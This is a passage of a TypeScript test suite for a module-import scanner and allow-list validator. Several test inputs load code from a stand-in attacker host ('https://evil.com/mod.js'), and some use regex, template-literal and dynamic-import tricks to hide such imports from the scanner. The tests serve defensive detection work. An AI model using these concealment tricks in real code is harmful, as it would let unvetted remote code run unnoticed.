        ].join("\n"),
        ["https://esm.sh"],
      );
    });

    it("should allow multiple hosts", async () => {
      await validateHTTPImports(
        'import a from "https://esm.sh/react";\nimport b from "https://cdn.example.com/lib.js";',
        ["https://esm.sh", "https://cdn.example.com"],
      );
    });

    it("should not flag non-HTTP imports", async () => {
      await validateHTTPImports(
        'import { foo } from "./local.ts";\nimport bar from "lodash";',
        ["https://esm.sh"],
      );
    });

    it("should handle source with no imports", async () => {
      await validateHTTPImports("const x = 1;", ["https://esm.sh"]);
    });
  });

  describe("extractModuleSpecifiers", () => {
    it("should collect local, bare, and remote specifiers across import forms", () => {
      const source = [
        `import { a } from "./helper.ts";`,
        `import "../side-effect.ts";`,
        `export { b } from "https://esm.sh/pkg";`,
        `import zod from "zod";`,
        `const load = () => import("./lazy.ts");`,
        'const rendered = `prefix ${import("./inside-template.ts")} suffix`;',
        `// import "./commented-out.ts";`,
        `const text = 'import "./inside-string.ts";';`,
        `const ignored = client.import("./not-a-module.ts");`,
      ].join("\n");

      assertEquals(extractModuleSpecifiers(source), [
        "./helper.ts",
        "../side-effect.ts",
        "https://esm.sh/pkg",
        "zod",
        "./lazy.ts",
        "./inside-template.ts",
      ]);
    });

    it("preserves multiline static import support", () => {
      const source = [
        `import {`,
        `  parse,`,
        `  stringify,`,
        `} from "https://esm.sh/yaml@2";`,
      ].join("\n");

      assertEquals(extractModuleSpecifiers(source), ["https://esm.sh/yaml@2"]);
    });
  });

  describe("scanModuleSpecifiers", () => {
    it("should require bundling when slash syntax can hide an import", () => {
      const scan = scanModuleSpecifiers(
        `const marker = /"/; import "https://evil.com/mod.js";`,
      );

      assertEquals(scan.requiresBundling, true);
    });

    it("should flag dynamic imports whose target is not a literal", () => {
      assertEquals(
        scanModuleSpecifiers(`const mod = import("https://" + host + "/mod.js");`),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: false,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should flag dynamic imports whose target is a template literal", () => {
      assertEquals(
        scanModuleSpecifiers("const mod = import(`https://${host}/mod.js`);"),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: false,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should fail closed when a template literal never terminates", () => {
      // An unterminated template swallows the rest of the file, so the scan
      // cannot claim the hidden text names no unconstrained import.
      const scan = scanModuleSpecifiers(
        "const tail = `never closed\nimport(target);",
      );
      assertEquals(
        scan.hasUnconstrainedDynamicImport,
        true,
        "an unreadable template must not yield a scan that reports no unconstrained import",
      );
    });

    it("should flag non-literal dynamic imports inside template interpolations", () => {
      assertEquals(
        scanModuleSpecifiers(
          "const rendered = `prefix ${import(remoteSpecifier)} suffix`;",
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: false,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should flag a dynamic import a regex brace hid inside an interpolation", () => {
      // A `}` inside a character class used to close the `${...}` walk early,
      // leaving the rest of the executable expression read as template text.
      assertEquals(
        scanModuleSpecifiers(
          'const rendered = `${/[}]/.test("}") ? import(remoteSpecifier) : ""}`;',
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
        "a regular-expression literal must not truncate the interpolation it sits in",
      );
    });

    it("should still accept ordinary division inside an interpolation", () => {
      assertEquals(
        scanModuleSpecifiers("export const half = (n: number) => `${n / 2} halves`;"),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
        "arithmetic in a template must bundle without being reported as a hidden import",
      );
    });

    it("should flag non-literal dynamic imports after lexical slash ambiguity", () => {
      assertEquals(
        scanModuleSpecifiers(
          `const marker = /"/; const target = "https://blocked.example/mod.js"; import(target);`,
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should flag non-literal dynamic imports after keyword-context regex literals", () => {
      for (
        const source of [
          `function marker() { return /"/; } const target = "https://blocked.example/mod.js"; import(target);`,
          `function marker() { throw /"/; } const target = "https://blocked.example/mod.js"; import(target);`,
          `switch (value) { case /"/: break; } const target = "https://blocked.example/mod.js"; import(target);`,
          `if (ready) /"/.test(""); const target = "https://blocked.example/mod.js"; import(target);`,
          `while (ready) /"/.test(""); const target = "https://blocked.example/mod.js"; import(target);`,
        ]
      ) {
        assertEquals(scanModuleSpecifiers(source), {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        });
      }
    });

    it("should flag non-literal dynamic imports after same-statement regex literals", () => {
      assertEquals(
        scanModuleSpecifiers(
          `const marker = /"/, target = "https://blocked.example/mod.js", load = import(target);`,
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should collect static dynamic imports after same-statement regex literals", () => {
      assertEquals(
        scanModuleSpecifiers(
          `const marker = /"/, load = import("https://esm.sh/mod.js");`,
        ),
        {
          specifiers: ["https://esm.sh/mod.js"],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should flag non-literal dynamic imports after a regex literal following a block", () => {
      assertEquals(
        scanModuleSpecifiers(
          `if (ready) {} /"/.test(""); const target = "https://evil.com/mod.js"; import(target);`,
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
        "a regex opening after a block must not let its quote hide the later non-literal import",
      );
    });

    it("should not treat strings and comments after ordinary division as imports", () => {
      assertEquals(
        scanModuleSpecifiers(
          [
            `const ratio = a / b;`,
            `const text = "import('https://evil.com/not-a-module.js')";`,
            `// import("https://evil.com/commented.js")`,
          ].join("\n"),
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should not treat strings after ordinary division on the same statement as imports", () => {
      assertEquals(
        scanModuleSpecifiers(
          `const ratio = a / b, text = "import('https://evil.com/not-a-module.js')";`,
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should not treat comments after ordinary division as imports", () => {
      assertEquals(
        scanModuleSpecifiers(
          [
            `const ratio = a / b;`,
            `// import("https://evil.com/commented.js")`,
            `/* import("https://evil.com/blocked.js") */`,
          ].join("\n"),
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should collect static dynamic imports with import attributes", () => {
      assertEquals(
        scanModuleSpecifiers(
          `const mod = await import("https://esm.sh/data.json", { with: { type: "json" } });`,
        ),
        {
          specifiers: ["https://esm.sh/data.json"],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: false,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should collect a literal dynamic import with a trailing comma", () => {
      assertEquals(
        scanModuleSpecifiers(`const mod = await import("https://esm.sh/mod.js",);`),
        {
          specifiers: ["https://esm.sh/mod.js"],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: false,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should ignore private member calls named import", () => {
      assertEquals(
        scanModuleSpecifiers(
          `class Client { #import = (_url: string) => "private"; value() { return this.#import("https://evil.com/not-a-module.js"); } }`,
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: false,
          hasDynamicCodeGeneration: false,
        },
      );
    });
  });
});
